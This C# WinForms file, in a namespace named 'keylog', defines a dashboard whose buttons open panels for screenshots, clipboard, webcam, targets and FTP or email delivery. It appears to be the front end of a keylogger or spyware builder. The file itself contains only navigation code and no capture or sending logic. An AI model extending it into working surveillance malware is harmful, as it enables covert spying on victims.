using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace keylog
{
    public partial class Dashboard : UserControl
    {
        public Dashboard()
        {
            InitializeComponent();
        }

        private void btn_user_Click(object sender, EventArgs e)
        {
            if (!mainForm.Instince.Metrocontainer.Controls.ContainsKey("User"))
            {
                User general = new User();
                general.Dock = DockStyle.Fill;
                mainForm.Instince.Metrocontainer.Controls.Add(general);
            }
            mainForm.Instince.Metrocontainer.Controls["User"].BringToFront();
            mainForm.Instince.Metroback.Visible = true;
        }

        private void btn_alert_Click(object sender, EventArgs e)
        {
            if (!mainForm.Instince.Metrocontainer.Controls.ContainsKey("Alert"))
            {
                Alert general = new Alert();
                general.Dock = DockStyle.Fill;
                mainForm.Instince.Metrocontainer.Controls.Add(general);
            }
            mainForm.Instince.Metrocontainer.Controls["Alert"].BringToFront();
            mainForm.Instince.Metroback.Visible = true;
        }

        private void btn_screenshot_Click(object sender, EventArgs e)
        {
            if (!mainForm.Instince.Metrocontainer.Controls.ContainsKey("Screenshot"))
            {
                Screenshot general = new Screenshot();
                general.Dock = DockStyle.Fill;
                mainForm.Instince.Metrocontainer.Controls.Add(general);
            }
            mainForm.Instince.Metrocontainer.Controls["Screenshot"].BringToFront();
            mainForm.Instince.Metroback.Visible = true;
        }

        private void btn_general_Click(object sender, EventArgs e)
        {
            if (!mainForm.Instince.Metrocontainer.Controls.ContainsKey("General"))
            {
                General general = new General();
                general.Dock = DockStyle.Fill;
                mainForm.Instince.Metrocontainer.Controls.Add(general);
            }
            mainForm.Instince.Metrocontainer.Controls["General"].BringToFront();
            mainForm.Instince.Metroback.Visible = true;
        }

        private void btn_ftp_Click(object sender, EventArgs e)
        {
            if (!mainForm.Instince.Metrocontainer.Controls.ContainsKey("FTP"))
            {
                FTP general = new FTP();
                general.Dock = DockStyle.Fill;
                mainForm.Instince.Metrocontainer.Controls.Add(general);
            }
            mainForm.Instince.Metrocontainer.Controls["FTP"].BringToFront();
            mainForm.Instince.Metroback.Visible = true;
        }

        private void btn_email_Click(object sender, EventArgs e)
        {
            if (!mainForm.Instince.Metrocontainer.Controls.ContainsKey("Email"))
            {
                Email general = new Email();
                general.Dock = DockStyle.Fill;
                mainForm.Instince.Metrocontainer.Controls.Add(general);
            }
            mainForm.Instince.Metrocontainer.Controls["Email"].BringToFront();
            mainForm.Instince.Metroback.Visible = true;
        }

        private void btn_target_Click(object sender, EventArgs e)
        {
            if (!mainForm.Instince.Metrocontainer.Controls.ContainsKey("Target"))
            {
                Target general = new Target();
                general.Dock = DockStyle.Fill;
                mainForm.Instince.Metrocontainer.Controls.Add(general);
            }
            mainForm.Instince.Metrocontainer.Controls["Target"].BringToFront();
            mainForm.Instince.Metroback.Visible = true;

        }

        private void btn_clipboard_Click(object sender, EventArgs e)
        {
            if (!mainForm.Instince.Metrocontainer.Controls.ContainsKey("_Clipboard"))
            {
                _Clipboard general = new _Clipboard();
                general.Dock = DockStyle.Fill;
                mainForm.Instince.Metrocontainer.Controls.Add(general);
            }
            mainForm.Instince.Metrocontainer.Controls["_Clipboard"].BringToFront();
            mainForm.Instince.Metroback.Visible = true;
        }

        private void btn_webcam_Click(object sender, EventArgs e)
        {
            if (!mainForm.Instince.Metrocontainer.Controls.ContainsKey("Webcam"))
            {
                Webcam general = new Webcam();
                general.Dock = DockStyle.Fill;
                mainForm.Instince.Metrocontainer.Controls.Add(general);
            }
            mainForm.Instince.Metrocontainer.Controls["Webcam"].BringToFront();
            mainForm.Instince.Metroback.Visible = true;
        }
    }
}
